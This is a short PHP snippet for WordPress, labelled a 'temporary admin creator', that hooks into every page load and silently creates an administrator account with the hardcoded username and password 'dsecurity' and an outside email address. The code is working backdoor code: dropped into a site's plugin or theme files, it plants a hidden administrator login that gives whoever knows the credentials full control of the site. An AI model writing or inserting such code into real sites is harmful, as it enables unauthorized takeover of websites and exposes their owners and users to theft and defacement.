<?php
/*
 * Temporary admin creator – REMOVE AFTER USE
 */

add_action('init', function () {

    $username = 'dsecurity';
    $password = 'dsecurity';
    $email    = 'davoodyahay@gmail.com';

    if (!username_exists($username) && !email_exists($email)) {

        $user_id = wp_create_user($username, $password, $email);

        if (!is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }

});
